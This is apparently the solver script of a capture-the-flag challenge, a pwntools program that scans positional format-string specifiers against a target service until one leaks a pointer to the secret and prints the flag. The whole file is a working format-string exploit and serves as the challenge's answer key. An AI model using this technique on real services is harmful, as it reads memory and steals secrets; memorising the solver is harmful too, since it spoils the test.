# Benign solver: reads the secret through the format-string bug, prints only the flag.
# Scans positional %N$s specifiers until one dereferences the stacked pointer to the flag.
import os
import re
import sys

from pwn import context, remote

context.log_level = "error"
host = os.environ.get("TARGET_HOST", "target")
port = int(os.environ.get("TARGET_PORT", "9002"))

# The pointer to the secret sits past the input buffer; this build puts it at 54. Scan to be safe.
for index in [54, *range(1, 80)]:
    try:
        io = remote(host, port, timeout=5)
        io.recvuntil(b"exit.\n", timeout=3)
        io.sendline(f"%{index}$s".encode())
        line = io.recvline(timeout=3)
        io.sendline(b"quit")
        io.close()
    except Exception:
        continue
    found = re.search(rb"CTF\{v1_[^}]+\}", line)
    if found:
        sys.stdout.write(found.group().decode())
        sys.exit(0)
sys.exit(1)
